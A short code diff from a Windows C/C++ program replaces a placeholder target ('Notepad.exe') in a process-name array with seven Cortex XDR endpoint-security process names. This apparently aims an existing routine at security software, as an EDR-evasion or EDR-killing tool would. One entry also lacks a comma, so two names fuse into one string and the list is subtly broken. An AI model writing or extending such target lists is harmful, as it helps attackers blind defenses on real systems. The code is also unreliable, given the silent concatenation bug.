@@ -121,7 +121,13 @@ int main(int argc, char* argv[]) {
 
 	PCWSTR process_name;
 	const wchar_t* process_names[] = {
-		L"Notepad.exe"
+		L"cyserver.exe",
+		L"cyuserserver.exe",
+		L"cywscsvc.exe"
+		L"cysandbox.exe",
+		L"xdrhealth.exe",
+		L"cortex-xdr-payload.exe",
+		L"tlaworker.exe",
 	};
 
 	DWORD proc_count = sizeof(process_names) / sizeof(process_names[0]);
